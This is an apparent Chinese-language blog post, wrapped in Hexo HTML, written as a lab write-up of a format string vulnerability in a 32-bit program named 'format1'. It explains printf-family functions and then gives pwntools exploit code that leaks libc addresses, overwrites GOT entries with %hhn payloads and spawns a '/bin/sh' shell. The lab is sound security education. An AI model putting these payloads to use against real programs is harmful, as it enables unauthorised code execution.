@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 5.4.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="marco reus">
+  
+
+  
+
+  
+
+  <title>格式化字符串 | reus09</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/flexblock.css">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="alternate" href="/atom.xml" title="reus09" type="application/atom+xml">
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://w.wallhaven.cc/full/l3/wallhaven-l3dkel.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          reus09
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">主页</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">格式化字符串</h1>
+          <h2 class="title-sub-wrap">
+            <strong>marco reus</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2021-11-03T12:46:59.000Z" itemprop="datePublished">2021-11-03</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">📒 漏洞分析</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/%E6%BC%8F%E6%B4%9E/">🏷️ 漏洞</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><div class="aplayer-box" data-url='https://qiniu.sukoshi.xyz/public/music/鹿乃 - アイロニ.mp3' data-name='アイロニ' data-artist='鹿乃' data-cover='https://qiniu.sukoshi.xyz/public/music/鹿乃 - アイロニ.jpg' data-lrc='https://qiniu.sukoshi.xyz/public/music/鹿乃 - アイロニ.lrc' data-lrcType='3' ></div>
+
+<h2 id="0x01-目的"><a href="#0x01-目的" class="headerlink" title="0x01 目的"></a>0x01 目的</h2><ul>
+<li>通过格式化字符串掌握泄露内存数据和覆写内存。</li>
+</ul>
+<h2 id="0x02-基础知识"><a href="#0x02-基础知识" class="headerlink" title="0x02 基础知识"></a>0x02 基础知识</h2><ul>
+<li><p>格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参数，并对这些参数进行处理。而格式化字符串将C语言的主要数据类型，以易于阅读的方式保存在字符串里。从程序输出数据、打印错误信息到处理字符串数据，格式化字符串几乎出现在所有的C程序中。</p>
+</li>
+<li><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><ul>
+<li><p>功能：向stdout按规定的格式输出信息；</p>
+</li>
+<li><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int printf (const char *format,[argument]...)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>format是格式控制字符串，其他参数为输出项；</li>
+<li><code>printf(&quot;Id=%d&quot;,Id);</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h3><ul>
+<li><p>功能：把格式化的数据写入某个字符串中；</p>
+</li>
+<li><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int sprintf(char *buffer,const char *format,[argument]...)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>buffer是要卸乳字符串的缓冲区；</li>
+<li>函数按照第二部分格式化字符的格式，把第三部分的数据进行格式化，然后在把格式化后的数据类型，存储到字符串的缓存区间里去；</li>
+<li><code>sprintf(buffer, &quot;Id=%d&quot;, Id);</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><ul>
+<li><p>功能：把格式化的数据写入某个字符串中，控制字符串长度；</p>
+</li>
+<li><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int snprintf(char *str,size_t size,const char *format,[argument]...)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在sprintf的基础上限制了可写入字符的最大值size；</li>
+<li>当格式化后的字符串长度=size，则将其中的size-1个字符复制到str中，并在最后添加字符串结束符<code>\0</code>；</li>
+<li><code>sprintf(buffer, 10,&quot;Id=%d&quot;, Id);</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h3 id="fprintf"><a href="#fprintf" class="headerlink" title="fprintf"></a>fprintf</h3><ul>
+<li><p>功能：用于格式化输出到一个流/文件中；</p>
+</li>
+<li><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fprintf(FILE *stream,const char *format,[argument]...)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>根据指定的格式控制字符串format向输出流stream中写入数据；</li>
+<li>当stream为stdout时，fprintf与printf的功能相同；</li>
+<li><code>printf(pfile,&quot;Id=%d&quot;,Id);</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h3 id="vprintf-vsprintf-vsnprintf-vfprintf"><a href="#vprintf-vsprintf-vsnprintf-vfprintf" class="headerlink" title="vprintf/vsprintf/vsnprintf/vfprintf"></a>vprintf/vsprintf/vsnprintf/vfprintf</h3><ul>
+<li>功能分别对应于printf/sprintf/snprintf/fprintf；</li>
+<li>将变参列表换成了va_list类型的参数</li>
+<li>格式：<ul>
+<li><code>vprintf (format,va_list);</code></li>
+<li><code>vsprintf (buffer,format,va_list);</code></li>
+<li><code>vsnprintf (buffer,256,format,va_list);</code></li>
+<li><code>vfprintf(stream, format, va_list);</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><ul>
+<li><p>格式化字符串是由普通字符串和格式化规定字符构成的字符序列：</p>
+<ul>
+<li>普通字符被原封不动地复制到输出流中；</li>
+<li>格式化规定字符则是以<code>%</code>开始，用来确定输出内容格式；</li>
+</ul>
+</li>
+<li><p>基本格式</p>
+<p><code>%[parameter][flags][fieldwidth][.precision][length]type</code></p>
+<ul>
+<li><p>parameter</p>
+<ul>
+<li>可以忽略或者是<code>n$</code>，n表示是参数列表的第n个参数，通过这种形式直接访问第n个参数；</li>
+</ul>
+</li>
+<li><p>flags</p>
+<ul>
+<li>用于调整输出和打印的符号、空白、小数点、八进制和十六进制前缀等；</li>
+</ul>
+</li>
+<li><p>fieldwidth</p>
+<ul>
+<li>限制显示数值的最小宽度，当输出字符个数不足限制的宽度时，默认用空格填充，或者flags中的其他填充方式，超过限制宽度不会截断，正常显示；</li>
+</ul>
+</li>
+<li><p>precision</p>
+<ul>
+<li>输出的最大长度；</li>
+</ul>
+</li>
+<li><p>length</p>
+<ul>
+<li>指浮点型参数或者整形参数的长度；<ul>
+<li>hh：1-byte；</li>
+<li>h：2-byte；</li>
+<li>l：4-byte；</li>
+<li>ll：8-byte；</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>type</p>
+<ul>
+<li><p>转换说明符，用来说明所应用的转换类型，它是唯一必须的格式域；</p>
+<p>| 字符 | 描述 |<br>| —— | —————————————————————————————— |<br>| d/i | 有符号十进制整数 |<br>| u | 无符号十进制整数 |<br>| x/X | 以十六进制形式输出无符号整数(不输出前缀0x) |<br>| o | 以八进制形式输出无符号整数(不输出前缀0) |<br>| s | 字符串 |<br>| c | 字符 |<br>| p | 指针 |<br>| n | 不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量 |<br>| f/F | 以小数形式输出单、双精度实数 |<br>| e/E | 以指数形式输出单、双精度实数 |<br>| g/G | 以%f%e中较短的输出宽度输出单、双精度实数，%e格式在指数小于-4或者大于等于精度时使用 |<br>| a/A | 浮点数、十六进制数字和p-计数法 |</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><ul>
+<li><p>格式化字符串函数是根据格式化字符串函数来进行解析的，那么相应的要被解析的参数的个数也自然是由这个<strong>格式化字符串</strong>所控制；</p>
+<p>根据<strong>cdecl的调用约定</strong>，在进入printf()函数之前，将参数从右到左依次压栈。进入printf()之后,函数首先获取第一个参数，一次读取一个字符。如果字符不是<code>%</code>，字符直接复制到输出中；否则，读取下一个非空字符，获取相应的参数并解析输出。<br>格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值，发生了<strong>格式化字符串漏洞</strong>。</p>
+</li>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/20211103005157.png" alt="img"></p>
+</li>
+</ul>
+<h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>用IDAPro对<code>format1</code>程序进行分析，程序逻辑简单，在<code>main</code>函数中调用了<code>getname</code>函数<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103005340.png" alt="image-20211103005340205"></li>
+</ul>
+</li>
+<li>查看<code>getname()</code>函数，读取用户输入，发现<code>print(buf)</code>将用户输入进行打印，存在格式化字符串漏洞。<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103005500.png" alt="image-20211103005500847"></li>
+</ul>
+</li>
+<li>由于程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，这两个表是一一对应的，看到带有**@plt**标志的函数时，这个函数其实就是个过渡作用，可以通过PLT表跳转到GOT表来得到函数真正的地址：<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103145752.png" alt="img"></li>
+</ul>
+</li>
+</ul>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
+<li>将exit函数的GOT表地址覆写为main函数的地址，程序每次退出时将再返回到main函数；</li>
+<li>通过printf格式化字符串漏洞，获取puts函数地址，再通过libc的相对地址偏移获取system的地址；</li>
+<li>用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，并在buf 中写入<code>/bin/sh</code>，当执行<code>printf(buf)</code>时，相当于执行<code>system(&#39;/bin/sh&#39;)</code>；</li>
+</ul>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><h4 id="将exit函数的GOT表地址覆盖为main函数地址"><a href="#将exit函数的GOT表地址覆盖为main函数地址" class="headerlink" title="将exit函数的GOT表地址覆盖为main函数地址"></a>将exit函数的GOT表地址覆盖为main函数地址</h4><ul>
+<li><p>将exit函数的GOT表地址覆写为main函数的地址，每次退出时将再返回到main函数。 先解决构建printf（format，[argument]）中format和argument</p>
+</li>
+<li><p>format覆写的格式为：% width c % num $ hhn</p>
+<ul>
+<li>width是将要写入到$hhn参数中的值，它由覆写的值和已经写入的长度决定，具体为：（已写入的长度-覆写的值）%<code>0x80</code><ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103010528.png" alt="image-20211103010528651"></li>
+<li>根据反汇编可以看到<code>buf</code>数组的长度为<code>0x80</code></li>
+</ul>
+</li>
+<li>num定了要写入的第num个参数，通过调试具体分析一下</li>
+</ul>
+</li>
+<li><p>这里给出两种方法</p>
+<ul>
+<li><p>用gdb调试</p>
+<ul>
+<li>在<code>main</code>和<code>printf</code>处设置断点。</li>
+<li>然后运行程序，运行到<code>printf</code>地方<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103010933.png" alt="image-20211103010933837"></li>
+</ul>
+</li>
+<li>buf的地址为<code>0xffffd12c</code>,是<code>printf</code>中格式化字符串的第<code>7</code>个参数:即<code>(0xffffd12c - 0xffffd110 ) / 4  = 7  </code></li>
+</ul>
+</li>
+<li><p>通过pwntools进行查找</p>
+<ul>
+<li><p>简单的exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./format1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + <span class="string">b&#x27; &#x27;</span> + <span class="string">b&#x27; %08x&#x27;</span> * <span class="number">20</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br></pre></td></tr></table></figure></li>
+<li><p>运行结果如下</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103011811.png" alt="image-20211103011811885"></li>
+<li>明显的看到<code>0x61616161</code>即为第七个参数</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>num的确定</p>
+<ul>
+<li>因为要把exit的GOT地址覆写为main函数地址，即<code>0x8048648</code>，所以应写入四个字节，即重复四次<code>% width c % num $ hhn</code>；</li>
+<li>粗略估计width最多占用3个字节，num最多占用2个字节，则每个格式<code>% widthc % num $ hhn</code>占用12个字节，四次重复共48个字节，占用48/4=12个参数；</li>
+<li>由于buf是从第7个参数开始，写入的地址从第7+12=19个参数开始，num依次为19、20、21、22；</li>
+</ul>
+</li>
+<li><p>确定<code>exit@got</code>的地址；</p>
+<ul>
+<li>这里同样给出两种方法</li>
+<li>gdb查看反汇编指令<ul>
+<li>先<code>disass main</code>查看main函数地址<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103012159.png" alt="image-20211103012159831"></li>
+</ul>
+</li>
+<li>发现<code>exit@plt</code>的地址为<code>0x8048480</code></li>
+<li>然后查看<code>disass 0x8048480</code>的反汇编，即进入<code>exit@plt</code>的函数内部<ul>
+<li> <img src="https://gitee.com/reus09/typora/raw/master/img/20211103145720.png" alt="image-20211103012501812"></li>
+</ul>
+</li>
+<li><code>jmp</code>所对应的的地址即为<code>exit@got</code> 为 <code>0x804a024</code></li>
+</ul>
+</li>
+<li>直接借用gdb中的got命令<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103012126.png" alt="image-20211103012126230"></li>
+<li><code>exit@got</code> 为 <code>0x804a024</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>main函数地址</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103012159.png" alt="image-20211103012159831"></li>
+<li>第一条即为<code>main</code>函数地址 ： <code>0x08048648</code></li>
+</ul>
+</li>
+<li><p>构造格式化字符串:</p>
+<ul>
+<li><p>确定了num和width，也确定了exit函数的got表地址为<code>0x804a024</code>，所以将要覆盖的exit@got地址<code>0x804a024</code>、<code>0x804a025</code>、<code>0x804a026</code>、<code>0x804a027</code>依次写入到第19、20、21、22个参数中，格式化字符串就构造好了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%72c%19$hhn%62c%20$hhn%126c%21$hhn%4c%22$hhnaaaa\x24\xa0\x04\x08\x25\xa0\x04\x08\x26\xa0\x04\ x08\x27\xa0\x04\x08</span><br></pre></td></tr></table></figure></li>
+<li><p>编写<code>generate_format(addr, value)</code>函数构造格式化字符串，addr为要覆写的地址，value为覆写的值，函数代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_format</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">    payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 已写入的长度</span></span><br><span class="line">    print_count = <span class="number">0</span></span><br><span class="line">    addr_part = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># range 4 的原因是 地址为四个字节，四个循环即可结束。</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> value &gt;&gt; (<span class="number">8</span>*i) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        one_byte = (value &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xff</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#  0x100的原因 防止出现负数</span></span><br><span class="line">        payload += <span class="string">&#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;</span>.<span class="built_in">format</span>((one_byte - print_count + <span class="number">0x100</span>) % <span class="number">0x100</span>,<span class="number">19</span>+i)</span><br><span class="line"></span><br><span class="line">        print_count += (one_byte - print_count) % <span class="number">0x100</span></span><br><span class="line">        addr_part += p32(addr+i).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.ljust((<span class="number">12</span>)*<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += addr_part</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>调用<code>generate_format(exit_got,main)</code>函数，生成的payload作为输入，执行后可以看到exit的got表的第一个地址被覆盖为main函数的地址，即<code>0x08048648</code>；</li>
+</ul>
+</li>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103013110.png" alt="image-20211103013033783" style="zoom: 200%;" /></li>
+</ul>
+</li>
+</ul>
+<h4 id="获取system的地址"><a href="#获取system的地址" class="headerlink" title="获取system的地址"></a>获取system的地址</h4><ul>
+<li><p>获取思路分析</p>
+<ul>
+<li>由于格式化字符串漏洞能够泄露内存关键数据，可以考虑利用这个漏洞泄露system 的地址，利用格式化字符串漏洞，泄露出GOT表中puts的地址，再利用libc中system函数与puts函数的偏移，计算出system地址；</li>
+</ul>
+</li>
+<li><p>先获取puts函数的got表地址，(这里与上面的方法相同)，所以puts函数got表的地址为<code>0x804a01c</code>，虽然可以直接查看<code>0x804a01c</code>内容即可得到puts函数的实际地址，这里使用格式化字符串漏洞来获取；</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103013217.png" alt="image-20211103013217060"></li>
+</ul>
+</li>
+<li><p>构造格式化字符串</p>
+<ul>
+<li>构造的格式化字符串格式为：<code>%num$s+puts@got</code>，即把puts@got的地址写入 buf，再通过<code>%s</code>读出；<ul>
+<li>此时读出的<code>puts</code>地址为 <code>puts在程序中真正运行的地址</code></li>
+</ul>
+</li>
+<li>其中<code>%num$s</code>占4个字节，是第7个参数；puts@got占4个字节，是第8个参数，num就可以写为8，即将puts@got的地址写入到第8个参数的位置；</li>
+<li>获取了puts的实际地址后，通过libc中两个函数的偏移即可得到system的地址，通过查阅资料可以得到libc的库的位置为<code>/lib/i386-linux-gnu/libc.so.6</code>；<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103013337.png" alt="image-20211103013337896"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>所以get_sys_addr 有如下代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br><span class="line">puts_got_addr = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">payload_puts =  <span class="string">&quot;%8$s&quot;</span> + p32(puts_got_addr).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload_puts)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sys_addr = puts_addr - offset</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>运行结果</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103015538.png" alt="image-20211103015538526"></li>
+<li>根据接收到的四个字节，我们可以看到拿到<code>puts</code>地址为<code>0xf7e37cd0</code>,<code>system</code>地址为<code>0xf7e0b830</code></li>
+<li>将其我们用gdb调试得到的地址相比，正确<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103145848.png" alt="image-20211103013901600"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="覆写got-表中printf地址"><a href="#覆写got-表中printf地址" class="headerlink" title="覆写got 表中printf地址"></a>覆写got 表中printf地址</h4><ul>
+<li><p>原理与覆写exit函数GOT表相同，调用<code>generate_format(printf@got,system_addr)</code>，生成的payload作为输入，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload_system = generate_format(printf_got,sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload_system)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>运行代码<img src="https://gitee.com/reus09/typora/raw/master/img/20211103015636.png" alt="image-20211103015636210"></p>
+<ul>
+<li>可以发现<code>printf@got</code>被覆盖为<code>0xf7e0b830</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="执行system-‘-bin-sh’"><a href="#执行system-‘-bin-sh’" class="headerlink" title="执行system(‘/bin/sh’)"></a>执行system(‘/bin/sh’)</h4><ul>
+<li><p>此时GOT表中printf地址已被覆写为system地址，在buf中输入<code>/bin/sh</code>，执行<code>printf(buf)</code>时，相当于执行<code>system(&#39;/bin/sh&#39;)</code>，最后代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()   </span><br></pre></td></tr></table></figure></li>
+<li><p>运行编写的python代码，成功拿到shell权限；</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211103015912.png" alt="image-20211103015912414"></li>
+</ul>
+</li>
+</ul>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ul>
+<li>格式化字符串漏洞泄露内存数据和覆写内存理解加深。</li>
+<li>Linux中got表和plt表的关系进一步理解。</li>
+<li>pwntools查看函数参数的位置的一些用法<ul>
+<li>pwntools可以直接导入<code>elf</code>,<code>process</code>,<code>libc库</code></li>
+</ul>
+</li>
+</ul>
+<div class="aplayer-box" data-url='https://qiniu.sukoshi.xyz/public/music/鹿乃 - アイロニ.mp3' data-name='アイロニ' data-artist='鹿乃' data-cover='https://qiniu.sukoshi.xyz/public/music/鹿乃 - アイロニ.jpg' data-lrc='https://qiniu.sukoshi.xyz/public/music/鹿乃 - アイロニ.lrc' data-lrcType='3' ></div>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="https://w.wallhaven.cc/full/6o/wallhaven-6oyw2w.png"></div>
+    
+    <div class="card-text">
+      
+        <a href="/2021/11/03/%E7%AE%97%E6%B3%95/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">算法小结</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://gitee.com/reus09/typora/raw/master/img/20211103151005.jpeg" class="soft-size--round soft-style--box" alt="reus09">
+    
+    
+      <h2>reus09</h2>
+    
+    
+      <p>足球世界瞬息万变，多特蒙德永不沉沦。</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>3</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        2
+      </div>
+      <div class="count-box--item">
